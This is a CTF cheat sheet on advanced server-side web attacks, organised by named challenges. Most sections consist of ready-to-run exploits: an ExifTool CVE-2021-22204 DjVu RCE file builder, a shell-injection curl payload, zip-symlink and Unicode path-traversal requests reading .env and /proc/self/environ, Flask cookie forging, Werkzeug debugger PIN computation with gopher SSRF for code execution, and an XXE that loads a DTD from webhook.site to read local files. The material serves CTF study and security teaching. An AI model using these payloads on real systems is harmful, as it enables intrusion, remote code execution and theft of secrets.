# CTF Web - Advanced Server-Side Techniques

## Table of Contents
- [ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)](#exiftool-cve-2021-22204--djvu-perl-injection-0xfun-2026)
- [Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)](#go-runebyte-length-mismatch--command-injection-vuwctf-2025)
- [Zip Symlink Path Traversal (UTCTF 2024)](#zip-symlink-path-traversal-utctf-2024)
- [Path Traversal Bypass Techniques](#path-traversal-bypass-techniques)
  - [Brace Stripping](#brace-stripping)
  - [Double URL Encoding](#double-url-encoding)
  - [Python os.path.join](#python-ospathjoin)
- [Nginx Alias Traversal to Leak .env (VolgaCTF 2018)](#nginx-alias-traversal-to-leak-env-volgactf-2018)
- [/dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)](#devfd-symlink-to-bypass-proc-filter-google-ctf-2017)
- [Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)](#unicode-homoglyph-path-traversal-u2e2e-csaw-2017)
- [Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)](#ruby-regexpescape-multibyte-character-bypass-square-ctf-2017)
- [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
- [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
- [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)

See also: [server-side-advanced-2.md](server-side-advanced-2.md) for Part 2 (SSRF-to-Docker, Castor XML, Apache ErrorDocument, SQLite path traversal, HQL non-breaking space, base64 path traversal, 8.3 short filename bypass, parse_url @ bypass, PHP zip:// LFI, XSS-to-SSTI, INSERT column shift, session cookie forgery). See also: [server-side-advanced-3.md](server-side-advanced-3.md) for Part 3 (WAV polyglot, multi-slash URL bypass, Xalan math:random, SoapClient CRLF, gopher no-host, SSRF credential leak). See also: [server-side-advanced-4.md](server-side-advanced-4.md) for Part 4 (WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, wget CRLF SMTP, Gopher→MySQL SQLi, React Server Components RCE, AMQP/TLS sslsplit, CairoSVG XXE, Bazaar repo reconstruction).

---

## ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)

**Affected:** ExifTool ≤ 12.23

**Vulnerability:** DjVu ANTa annotation chunk parsed with Perl `eval`.

**Craft minimal DjVu exploit:**
```python
import struct

def make_djvu_exploit(command):
    # ANTa chunk with Perl injection
    ant_data = f'(metadata "\\c${{{command}}}")'.encode()

    # INFO chunk (1x1 image)
    info = struct.pack('>HHBBii', 1, 1, 24, 0, 300, 300)

    # Build DJVU FORM
    djvu_body = b'DJVU'
    djvu_body += b'INFO' + struct.pack('>I', len(info)) + info
    if len(info) % 2: djvu_body += b'\x00'
    djvu_body += b'ANTa' + struct.pack('>I', len(ant_data)) + ant_data
    if len(ant_data) % 2: djvu_body += b'\x00'

    # FORM header
    # AT&T = optional 4-byte prefix; FORM = IFF chunk type (separate fields)
    djvu = b'AT&T' + b'FORM' + struct.pack('>I', len(djvu_body)) + djvu_body
    return djvu

exploit = make_djvu_exploit("system('cat /flag.txt')")
with open('exploit.djvu', 'wb') as f:
    f.write(exploit)
```

**Detection:** Check ExifTool version. DjVu format is the classic vector. Upload the crafted DjVu to any endpoint that processes images with ExifTool.

---

## Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)

**Pattern (Go Go Cyber Ranger):** Go validates `len([]rune(input)) > 32` but copies `len([]byte(input))` bytes.

**Key insight:** Multi-byte UTF-8 chars (emoji = 4 bytes) count as 1 rune but 4 bytes → overflow.

**Exploit:** 8 emoji (32 bytes, 8 runes) + `";cmd\n"` = 40 bytes total, passes 32-rune check but overflows into adjacent buffer.

```bash
# If flag check uses: exec.Command("/bin/sh", "-c", fmt.Sprintf("test \"%s\" = \"%s\"", flag, input))
# Inject: ";od f*\n"
payload='🔥🔥🔥🔥🔥🔥🔥🔥";od f*\n'
curl -X POST http://target/check -d "secret=$payload"
```

**Detection:** Go web app with length check on `[]rune` followed by byte-level operations (copy, buffer write). Always check for rune/byte mismatch in Go.

---

## Zip Symlink Path Traversal (UTCTF 2024)

**Pattern (Schrödinger):** Server extracts uploaded ZIP without checking symlinks.

```bash
# Create symlink to target file, zip with -y to preserve
ln -s /path/to/flag.txt file.txt
zip -y exploit.zip file.txt
# Upload → server follows symlink → exposes file content
```

**Detection:** Any upload+extract endpoint. `zip -y` preserves symlinks. Many zip extraction utilities follow symlinks by default.

---

## Path Traversal Bypass Techniques

### Brace Stripping
`{.}{.}/flag.txt` → `../flag.txt` after processing

### Double URL Encoding
`%252E%252E%252F` → `../` after two decode passes

### Python os.path.join
`os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)

---

### Nginx Alias Traversal to Leak .env (VolgaCTF 2018)

**Pattern:** Nginx `alias` misconfiguration allows path traversal when a `location` block's path doesn't end with `/` but the `alias` does. The path remainder is appended unsafely, allowing `..` traversal out of the aliased directory.

```nginx
# Vulnerable Nginx configuration:
location /laravel {
    alias /var/www/html/public/;
}
# Note: /laravel has NO trailing slash, but alias has one
# This creates a join mismatch: /laravel<anything> maps to /var/www/html/public/<anything>
```

```bash
# Exploit: traverse out of the public/ directory to read .env
GET /laravel../.env HTTP/1.1
# Nginx resolves: alias "/var/www/html/public/" + "../.env" = /var/www/html/.env

# Read application source
GET /laravel../app/Http/Controllers/AuthController.php HTTP/1.1

# Read other config files
GET /laravel../config/database.php HTTP/1.1
GET /laravel../storage/logs/laravel.log HTTP/1.1
```

```python
import requests

target = "http://target"

# Leak Laravel .env file (contains APP_KEY, DB credentials, etc.)
r = requests.get(f"{target}/laravel../.env")
if r.status_code == 200:
    print("[+] .env contents:")
    print(r.text)
    # Look for APP_KEY, DB_PASSWORD, API keys, etc.
```

**Detection checklist:**
```text
# Test for the misconfiguration on common paths:
/static../
/assets../
/public../
/media../
/uploads../
/laravel../
# Any location block using alias without matching trailing slashes
```

**Key insight:** When an Nginx `location` directive lacks a trailing slash but its `alias` has one, the path is joined unsafely, allowing `..` traversal out of the aliased directory. This is a common misconfiguration in Laravel deployments where `/laravel` maps to the `public/` directory. Always check for trailing slash mismatches between `location` and `alias` directives.

---

## Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)

**Pattern:** U+2E2E (REVERSED QUESTION MARK, UTF-8: `E2 B8 AE`) normalizes to a period (U+002E, 0x2E) in some Python HTTP backends and Unicode normalization layers. Sending `%E2%B8%AE%E2%B8%AE/flag.txt` bypasses ASCII dot checks (`..` blocked) while the resolved path becomes `../flag.txt`.

```bash
# Standard path traversal blocked by ASCII dot check:
curl "http://target/files/../../flag.txt"   # blocked: contains ".."

# U+2E2E homoglyph bypass:
curl "http://target/files/%E2%B8%AE%E2%B8%AE/flag.txt"
# Backend normalizes E2B8AE → 0x2E (period), resolves as ../flag.txt
```

```python
import requests

# U+2E2E = REVERSED QUESTION MARK (⸮), UTF-8: 0xE2 0xB8 0xAE
# Normalizes to FULL STOP (.) in NFKC/NFC after some transformations

homoglyph_dot = '\u2E2E'
payload = f"{homoglyph_dot}{homoglyph_dot}/flag.txt"

r = requests.get(f"http://target/files/{payload}")
# If backend normalizes Unicode before filesystem access but after validation:
print(r.text)
```

**Other Unicode dot homoglyphs to try:**
```text
U+2E2E  ⸮  REVERSED QUESTION MARK  (E2 B8 AE) → .
U+FF0E  ．  FULLWIDTH FULL STOP     (EF BC 8E) → .
U+2024  ․  ONE DOT LEADER          (E2 80 A4) → .
U+FE52  ﹒  SMALL FULL STOP        (EF B9 92) → .
```

**Key insight:** Unicode normalization inconsistencies between the validation layer and execution layer enable path traversal with non-ASCII dot homoglyphs. U+2E2E is a lesser-known alternative to fullwidth tricks (U+FF0E). Test normalization forms NFKC and NFC — Python's `unicodedata.normalize('NFKC', char)` reveals what each character collapses to.

---

## Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)

**Pattern:** Ruby's `Regexp.escape` operates byte-by-byte. A `%bf` byte followed by `%5c` (backslash) forms a valid GBK/Big5 multibyte character, consuming the backslash. This leaves subsequent characters unescaped, breaking the intended regex escaping.

```ruby
# Regexp.escape escapes special chars by prepending backslash
# e.g., Regexp.escape("a.b") → "a\\.b"

# Vulnerability: byte 0xBF followed by 0x5C (backslash) is a valid GBK character
# Regexp.escape sees 0xBF → not a special char, passes through
# Then sees 0x5C → escapes it to 0x5C 0x5C (double backslash)
# But in GBK: 0xBF 0x5C is ONE character (the lead byte absorbs the backslash)
# So the "escape" produces: 0xBF 0x5C 0x5C = GBK_char + 0x5C
# The second backslash then escapes the NEXT character, not the intended one

# Result: subsequent input characters become unescaped in the regex
```

```python
# In a CTF context: HTTP request with GBK lead byte in parameter
import requests

# %bf%5c in URL-encoded form — in GBK this is one character
# When Ruby calls Regexp.escape on the input, the backslash is consumed
payload = "\xbf\x5c" + ".*"   # GBK char eats the backslash; .* is now unescaped in regex

r = requests.get("http://target/search", params={"q": payload})
# If backend uses: /#{Regexp.escape(params[:q])}/  as a regex pattern
# The .* passes through unescaped, matching any string
```

**Exploitation scenario:**
```ruby
# Vulnerable code:
pattern = /#{Regexp.escape(user_input)}/
if flag.match(pattern)
  puts "Match!"
end

# Inject: "\xbf\x5c.*" → Regexp.escape produces "\xbf\\\\..*"
# In GBK context: first two bytes are one char, leaving ".*" unescaped
# Pattern becomes: /\xbf\\.*/ which in GBK matches the flag (greedy .*)
```

**Key insight:** Byte-level escaping functions are vulnerable to multibyte character injection. A GBK/Big5 lead byte (0xBF) followed by 0x5C forms a valid single character, consuming the backslash that `Regexp.escape` just added. This leaves subsequent characters unescaped. Check for non-ASCII input handling in Ruby regex validation, especially when the application supports CJK character sets.

---

## /dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)

**Pattern:** When an application filters `/proc` in file read parameters to prevent access to process information, `/dev/fd` provides an alternative path since it is a symlink to `/proc/self/fd` on Linux.

```bash
# Bypass /proc filter to read environment variables
curl "http://target/?f=/dev/fd/../environ"
# /dev/fd -> /proc/self/fd, then ../ traverses to /proc/self/

# Read command line
curl "http://target/?f=/dev/fd/../cmdline"

# Read memory maps
curl "http://target/?f=/dev/fd/../maps"

# Read specific file descriptor contents
curl "http://target/?f=/dev/fd/0"   # stdin
curl "http://target/?f=/dev/fd/1"   # stdout
curl "http://target/?f=/dev/fd/3"   # often a database or config file
```

**Other /proc filter bypass paths:**
```text
/dev/fd/../environ         # → /proc/self/environ
/dev/fd/../cmdline         # → /proc/self/cmdline
/dev/fd/../maps            # → /proc/self/maps
/dev/fd/../status          # → /proc/self/status
/dev/fd/../cwd/app.py      # → /proc/self/cwd/app.py (working dir)
/dev/stdin/../environ      # /dev/stdin → /proc/self/fd/0, then ../
```

**Key insight:** `/dev/fd` is a symlink to `/proc/self/fd` on Linux. Traversing up with `../` reaches `/proc/self/`, bypassing blocklist checks for the literal string `/proc`. Similarly, `/dev/stdin`, `/dev/stdout`, and `/dev/stderr` link into `/proc/self/fd/` and can be used as traversal pivot points. Always test these alternatives when `/proc` is blacklisted.

---

## Flask/Werkzeug Debug Mode Exploitation

**Pattern (Meowy, Nullcon 2026):** Flask app with Werkzeug debugger enabled + weak session secret.

**Attack chain:**
1. **Session secret brute-force:** When secret is generated from weak RNG (e.g., `random_word` library, short strings):
   ```bash
   flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
   # Or brute-force programmatically:
   for word in wordlist:
       try:
           data = decode_flask_cookie(cookie, word)
           print(f"Secret: {word}, Data: {data}")
       except: pass
   ```
2. **Forge admin session:** Once secret is known, forge `is_admin=True`:
   ```bash
   flask-unsign --sign --cookie '{"is_admin": true}' --secret "found_secret"
   ```
3. **SSRF via pycurl:** If `/fetch` endpoint uses pycurl, target `http://127.0.0.1/admin/flag`
4. **Header bypass:** Some endpoints check `X-Fetcher` or similar custom headers — include in SSRF request

**Werkzeug debugger RCE:** If `/console` is accessible:
1. **Read system identifiers via SSRF:** `/etc/machine-id`, `/sys/class/net/eth0/address`
2. **Get console SECRET:** Fetch `/console` page, extract `SECRET = "..."` from HTML
3. **Compute PIN cookie:**
   ```python
   import hashlib
   h = hashlib.sha1()
   for bit in (username, "flask.app", "Flask", modfile, str(node), machine_id):
       h.update(bit.encode() if isinstance(bit, str) else bit)
   h.update(b"cookiesalt")
   cookie_name = "__wzd" + h.hexdigest()[:20]
   h.update(b"pinsalt")
   num = f"{int(h.hexdigest(), 16):09d}"[:9]
   pin = "-".join([num[:3], num[3:6], num[6:]])
   pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
   ```
4. **Execute via gopher SSRF:** If direct access is blocked, use gopher to send HTTP request with PIN cookie:
   ```python
   cookie = f"{cookie_name}={int(time.time())}|{pin_hash}"
   req = f"GET /console?__debugger__=yes&cmd={cmd}&frm=0&s={secret} HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nCookie: {cookie}\r\n\r\n"
   gopher_url = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)
   # SSRF to gopher_url
   ```

**Key insight:** Even when Werkzeug console is only reachable from localhost, the combination of SSRF + gopher protocol allows full PIN bypass and RCE. The PIN trust cookie authenticates the session without needing the actual PIN entry.

---

## XXE with External DTD Filter Bypass

**Pattern (PDFile, PascalCTF 2026):** Upload endpoint filters keywords ("file", "flag", "etc") in uploaded XML, but external DTD fetched via HTTP is NOT filtered.

**Technique:** Host malicious DTD on webhook.site or attacker server:
```xml
<!-- Remote DTD (hosted on webhook.site) -->
<!ENTITY % data SYSTEM "file:///app/flag.txt">
<!ENTITY leak "%data;">
```

```xml
<!-- Uploaded XML (clean, passes filter) -->
<?xml version="1.0"?>
<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
<book><title>&leak;</title></book>
```

**Key insight:** XML parser fetches and processes external DTD without applying the upload keyword filter. Response includes flag in parsed field.

**Setup with webhook.site API:**
```python
import requests
TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
             json={"default_content": dtd, "default_content_type": "text/xml"})
```

---

## Path Traversal: URL-Encoded Slash Bypass

**`%2f` bypass:** Nginx route matching doesn't decode `%2f` but filesystem does:
```bash
curl 'https://target/public%2f../nginx.conf'
# Nginx sees "/public%2f../nginx.conf" → matches /public/ route
# Filesystem resolves to /public/../nginx.conf → /nginx.conf
```
**Also try:** `%2e` for dots, double encoding `%252f`, backslash `\` on Windows.

---

See [server-side-advanced-4.md](server-side-advanced-4.md) for WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, wget CRLF SMTP, Gopher→MySQL SQLi, React Server Components RCE, AMQP/TLS interception, CairoSVG XXE, and Bazaar repo reconstruction.
